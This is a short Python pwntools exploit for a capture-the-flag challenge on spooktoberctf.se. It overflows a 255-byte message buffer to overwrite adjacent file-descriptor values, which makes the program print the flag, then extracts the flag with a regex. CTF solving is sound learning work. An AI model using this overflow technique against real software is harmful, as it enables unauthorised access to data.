#!/usr/bin/env python3
from pwn import *
import sys
import re

context.log_level = "ERROR"
context.arch      = 'i386'
context.os        = 'linux'
context.word_size = 32
context.timeout   = 1

def conn():
    if args.LOCAL:
        return process("./program")
    else:
        return remote("spooktoberctf.se", 22001)


with conn() as c:
    # message is 255 bytes in size, but because of alignment, flag_fd and nowhere_fd starts after 260 bytes
    # nowhere_fd is at 260 bytes after message
    # flag_fd is at 264 bytes after message, i.e. 4 bytes after nowhere_fd
    a = c.recv(timeout=1) # "let us both" blah blah "share secrets" blah blah
    print(a, file=sys.stderr)
    c.send(b"A" * 254 + b"\0" + b"\0" * 5 + p32(4, sign="signed") + p32(1, sign="signed") + b"\n")
    a = c.recvline(timeout=0.3) # our AAA string
    print(a, file=sys.stderr)
    a = c.recvline(timeout=0.3) # "now my turn"
    print(a, file=sys.stderr)

    # Wait for the sleep to finish
    flag_text = c.recvline(timeout=2).decode('utf-8').strip()
    print(flag_text, file=sys.stderr)
    flag = re.sub(r"^.*(spooky\{[^\}]+\}).*$", r"\1", flag_text)
    print(flag)
    
    try:
        a = c.recv(timeout=10) # The deed is done...
        print(a, file=sys.stderr)
    except EOFError:
        pass

    c.close()
